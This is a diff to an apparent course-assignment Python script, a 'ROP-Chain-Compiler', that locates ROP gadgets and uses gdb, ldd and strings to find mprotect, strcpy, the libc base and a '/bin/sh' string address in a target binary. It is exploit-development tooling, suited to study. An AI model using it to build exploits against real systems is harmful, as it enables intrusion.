@@ -2,7 +2,11 @@ from capstone import *
 from elftools.common.py3compat import bytes2str
 from elftools.elf.elffile import ELFFile
 import argparse
-import struct 
+import struct
+import subprocess
+import os
+import io
+ 
 # 128k flash for the ATXmega128a4u
 flashsize = 128 * 1024
 libc_base_add = 0xb7e05000 
@@ -57,6 +61,73 @@ def get_binary_instr(filename):
     
     return (None, None)
 
+
+def find_mprotect_addr(vuln_binary):
+
+    with io.FileIO("find_functions.gdb", "w") as file:
+        file.write("b main\nrun hello\np mprotect\np __strcpy_sse2\n")
+
+    cmd = "gdb --batch --command=./find_functions.gdb --args "
+    cmd = cmd + vuln_binary
+    cmd = cmd + " hello|grep mprotect|head -1|awk '{print $8}'"
+    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
+    proc.wait()
+    mprotect_addr = int(proc.stdout.read(), 16)
+
+    os.remove("./find_functions.gdb")
+    return mprotect_addr
+
+
+def find_strcpy_addr(vuln_binary):
+
+    with io.FileIO("find_functions.gdb", "w") as file:
+        file.write("b main\nrun hello\np mprotect\np __strcpy_sse2\n")
+
+    cmd = "gdb --batch --command=./find_functions.gdb --args "
+    cmd = cmd + vuln_binary
+    cmd = cmd + " hello|grep __strcpy_sse2|head -1|awk '{print $8}'"
+    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
+    proc.wait()
+    strcpy_addr = int(proc.stdout.read(), 16)
+
+    os.remove("./find_functions.gdb")
+    return strcpy_addr 
+
+
+def find_libc_addr(vuln_binary):
+    with io.FileIO("test.gdb", "w") as file:
+        file.write("b main\nrun hello\ninfo proc mappings\n")
+
+    cmd = "gdb --batch --command=./test.gdb --args "
+    cmd = cmd + vuln_binary
+    cmd = cmd + " hello|grep libc|grep so|head -1|awk '{print $1}'"
+    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
+    proc.wait()
+    libc_base_addr = int(proc.stdout.read(), 16)
+
+    os.remove("./test.gdb")
+    return libc_base_addr
+
+
+def find_null_byte(vuln_bin, libc_base_addr):
+
+    cmd = "ldd "
+    cmd = cmd + vuln_bin
+    cmd = cmd + "|grep libc|awk '{print $3}'"
+    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
+    proc.wait()
+    libc_path = proc.stdout.read()
+
+    strings_command = "strings -t x " + libc_path[:-1] + "|grep /bin/sh|awk '{print $1}'"
+
+    proc = subprocess.Popen(strings_command, shell=True, stdout=subprocess.PIPE)
+    proc.wait()
+    bin_sh_offset = int(proc.stdout.read(), 16)
+
+    null_byte_location = libc_base_addr + bin_sh_offset + len("/bin/sh")
+    return null_byte_location
+
+    
 def find_3pop_ret(instr_list, ret_index):
 	# find pop, pop, pop, ret
     found = False
@@ -80,6 +151,7 @@ def find_3pop_ret(instr_list, ret_index):
     else:
         print '3 pop gadget not found !'
         return None
+
 
 def find_2pop_ret(instr_list, ret_index):
     # find pop, pop, ret
@@ -204,8 +276,6 @@ def print_all_gadgets(instr_list, ret_index):
             temp_index = temp_index + 1
 
 if __name__ == '__main__':
-	#process_file('/lib/i386-linux-gnu/libc.so.6')
-	#process_file('../Offensive-Security/hw3/vuln3')
 
     parser = argparse.ArgumentParser('ROP-Chain-Compiler')
     parser.add_argument("vuln_bin", type=str, help="Path to 32 bit x86 binary which is to be exploited")
@@ -267,4 +337,30 @@ if __name__ == '__main__':
     if pop_pop_pop_ret_addr == None:
         print 'Unable to find gadget with 3 pops !'
         exit(4)
+
+    mprotect_addr = find_mprotect_addr(args.vuln_bin)
+    if mprotect_addr == None:
+        print 'Unable to find address of mprotect system call !'
+        exit(5)
+    print 'mprotect address = 0x%x' %(mprotect_addr)
+
+    strcpy_addr = find_strcpy_addr(args.vuln_bin)
+    if strcpy_addr == None:
+        print 'Unable to find address of strcpy function !'
+        exit(6)
+    print 'strcpy address = 0x%x' %(strcpy_addr)
+
+    libc_base_addr = find_libc_addr(args.vuln_bin)
+    if libc_base_addr == None:
+        print 'Unable to find libc base address !'
+        exit(7)
+    print 'libc base address = 0x%x' %(libc_base_addr)
+
+    null_byte = find_null_byte(args.vuln_bin, libc_base_addr)
+    if null_byte == None:
+        print 'Unable to find a NULL byte in libc !'
+        exit(8)
+    print 'Null byte present at 0x%x' %(null_byte)
+
+
 
